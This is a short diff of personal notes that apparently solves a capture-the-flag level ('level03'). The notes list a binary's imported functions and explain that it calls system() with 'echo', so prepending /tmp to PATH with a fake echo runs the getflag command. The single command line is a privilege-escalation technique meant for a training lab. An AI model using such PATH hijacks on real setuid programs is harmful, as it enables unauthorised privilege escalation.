@@ -1,7 +1,3 @@
-gdm
-
-layout asm
-
 nm result:
          U getegid@@GLIBC_2.0
          U geteuid@@GLIBC_2.0
@@ -10,7 +6,8 @@ nm result:
          U setresuid@@GLIBC_2.0
          U system@@GLIBC_2.0
 
+This program use system to execute command (here it's echo).
 
-replace echo by cat and launch not work
+You can exploit that to edit env with your properly echo which contain getflag command:
 
-exploit getuid
+PATH=/tmp:$PATH ./level03
